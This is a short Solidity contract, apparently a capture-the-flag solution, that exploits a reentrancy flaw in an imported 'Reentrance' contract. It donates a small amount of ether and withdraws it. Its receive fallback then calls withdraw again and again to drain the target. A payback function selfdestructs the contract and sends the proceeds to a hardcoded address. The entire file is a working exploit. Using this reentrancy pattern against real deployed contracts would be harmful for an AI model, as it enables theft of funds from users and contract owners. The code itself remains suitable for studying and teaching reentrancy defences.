pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract Solve {
    Reentrance target;

    constructor() payable {}

    function attack(address _address) public {
        target = Reentrance(_address);
        target.donate{value: 0.001 ether}(address(this));
        target.withdraw(0.001 ether);
    }

    // :)
    function payback() public {
        selfdestruct(payable(0xE3c1ca5c45818e57B298f3a080c8502BF7154352));
    }

    receive() external payable {
        target.withdraw(0.001 ether);
    }
}